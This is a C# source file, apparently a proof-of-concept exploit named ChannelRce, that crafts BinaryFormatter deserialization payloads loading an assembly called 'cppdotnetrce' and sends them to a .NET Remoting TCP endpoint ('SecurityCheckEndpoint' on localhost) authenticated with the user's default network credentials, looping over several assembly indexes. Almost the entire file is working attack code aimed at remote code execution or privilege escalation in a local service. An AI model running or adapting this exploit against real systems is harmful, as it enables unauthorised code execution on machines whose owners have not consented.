using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Runtime.Remoting.Messaging;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace ChannelRce
{
    [Serializable]
    public enum BinaryHeaderEnum : byte
    {
        SerializedStreamHeader,
        Object,
        ObjectWithMap,
        ObjectWithMapAssemId,
        ObjectWithMapTyped,
        ObjectWithMapTypedAssemId,
        ObjectString,
        Array,
        MemberPrimitiveTyped,
        MemberReference,
        ObjectNull,
        MessageEnd,
        Assembly,
        ObjectNullMultiple256,
        ObjectNullMultiple,
        ArraySinglePrimitive,
        ArraySingleObject,
        ArraySingleString,
        CrossAppDomainMap,
        CrossAppDomainString,
        CrossAppDomainAssembly,
        MethodCall,
        MethodReturn,
    }
    class Program
    {  //load cppdotnetrce.dll cppdotnet dll
        public static byte[] SerializeObject()
        {

            MemoryStream stm = new MemoryStream();
            BinaryWriter sout = new BinaryWriter(stm);
            byte binaryHeaderEnumhdr = (byte)BinaryHeaderEnum.Object;

            int topId = 1;
            int headerId = 1;
            int binaryFormatterMajorVersion = 1;
            int binaryFormatterMinorVersion = 0;

            sout.Write((byte)binaryHeaderEnumhdr);
            sout.Write(topId);
            sout.Write(headerId);
            sout.Write(binaryFormatterMajorVersion);
            sout.Write(binaryFormatterMinorVersion);
            byte binaryHeaderEnumasm = (byte)BinaryHeaderEnum.Assembly;

            int assemId = 5686;

            string assemblyString = "cppdotnetrce";

            sout.Write((byte)binaryHeaderEnumasm);
            sout.Write(assemId);
            sout.Write(assemblyString);

            byte binaryHeaderEnummap = (byte)BinaryHeaderEnum.ObjectWithMapTypedAssemId;

            int objectId = 1234;

            string name = "fake";

            int numMembers = 0;

            //int assemId = 5686;

            sout.Write((byte)binaryHeaderEnummap);
            sout.Write(objectId);
            sout.Write(name);
            sout.Write(numMembers);
            sout.Write(assemId);
            return stm.ToArray();
        }

        public static byte[] SerializeObject(object o, bool remote)
        {
            MemoryStream stm = new MemoryStream();
            BinaryFormatter fmt = new BinaryFormatter
            {
                AssemblyFormat = FormatterAssemblyStyle.Simple
            };

            if (remote)
            {
                fmt.SurrogateSelector = new RemotingSurrogateSelector();
            }

            fmt.Serialize(stm, o);

            return stm.ToArray();
        }

        public static byte[] LoadAsmTorce(int asm_index)
        {

            object o = new FakeDataSet(asm_index);
            byte[] data = SerializeObject(o, false);
            return data;
        }

        private static string ReadHeaderString(BinaryReader reader)
        {
            int encType = reader.ReadByte();
            int length = reader.ReadInt32();

            byte[] data = reader.ReadBytes(length);

            if (encType == 0)
            {
                return Encoding.Unicode.GetString(data);
            }
            else if (encType == 1)
            {
                return Encoding.UTF8.GetString(data);
            }
            else
            {
                throw new InvalidOperationException("Invalid string encoding");
            }
        }
        private static void ReadHeaders(BinaryReader reader)
        {
            ushort token = reader.ReadUInt16();

            while (token != 0)
            {
                string name = token.ToString();
                object value = null;

                switch (token)
                {
                    case 1:
                        {
                            name = ReadHeaderString(reader);
                            value = ReadHeaderString(reader);
                        }
                        break;
                    default:
                        byte dataType = reader.ReadByte();

                        switch (dataType)
                        {
                            case 0:
                                break;
                            case 1:
                                value = ReadHeaderString(reader);
                                break;
                            case 2:
                                value = reader.ReadByte();
                                break;
                            case 3:
                                value = reader.ReadUInt16();
                                break;
                            case 4:
                                value = reader.ReadInt32();
                                break;
                            default:
                                throw new InvalidOperationException("Unknown header data type");
                        }
                        break;
                }

                Console.WriteLine($"Header: {name}={value}");
                token = reader.ReadUInt16();
            }
        }


        private static object ParseResult(BinaryReader reader)
        {
            uint magic = reader.ReadUInt32();

            if (magic != 0x54454E2E)
            {
                throw new InvalidDataException("Invalid magic value");
            }

            int Major = reader.ReadByte(); // Major
            int Minor = reader.ReadByte(); // Minor
            int OperationType = reader.ReadUInt16(); // Operation Type
            int Contentdistribution = reader.ReadUInt16(); // Content distribution

            int len = reader.ReadInt32();

            ReadHeaders(reader);

            byte[] data = reader.ReadBytes(len);

            BinaryFormatter fmt = new BinaryFormatter
            {
                AssemblyFormat = FormatterAssemblyStyle.Simple
            };

            MemoryStream stm = new MemoryStream(data);
            if (fmt.Deserialize(stm) is IMethodReturnMessage ret)
            {
                if (ret.Exception != null)
                {
                    // throw ret.Exception;
                    return ret.Exception;
                }
                else
                {
                    return ret.ReturnValue ?? "void";
                }
            }
            else
            {
                return "Error, invalid return message.";
            }
        }
        static void Exploit(int asm_index)
        {

            Uri _uri = new Uri("tcp://127.0.0.1:52012/SecurityCheckEndpoint", UriKind.Absolute);


            TcpClient client = new TcpClient();

            client.Connect(_uri.Host, _uri.Port);

            Stream ret = client.GetStream();


            NegotiateStream stm = new NegotiateStream(ret);
            NetworkCredential cred = CredentialCache.DefaultNetworkCredentials;

            stm.AuthenticateAsClient(cred, String.Empty, ProtectionLevel.EncryptAndSign, TokenImpersonationLevel.Impersonation);

            ret = stm;

            //  byte[] data = SerializeObject();


            byte[] data = LoadAsmTorce(asm_index);

            MemoryStream stm1 = new MemoryStream();
            BinaryWriter writer = new BinaryWriter(stm1);
            TcpMessageWriter messageWriter = new TcpMessageWriter(writer);

            messageWriter.WritePreamble(OperationType.Request, data.Length);
            messageWriter.WriteContentTypeHeader("application/octet-stream");

            messageWriter.WriteRequestUriHeader(_uri);
            messageWriter.WriteCustomHeader("__RequestUri", _uri.LocalPath);

            messageWriter.WriteEndHeader();

            writer.Write(data);

            using (var netStream = ret)
            {
                using (var netWriter = new BinaryWriter(netStream))
                {
                    netWriter.Write(stm1.ToArray());

                    BinaryReader reader = new BinaryReader(netStream);
                    object obj = ParseResult(reader);
                    Console.WriteLine(obj);

                }
            }

            return;

        }
        static void Main(string[] args)
        {
            int asmstart = 3;
            int asmend = 10;
            Exploit(0);
            for (int i = asmstart; i < asmend; i++)
            {
                Exploit(i);
            }
          
        }
    }
}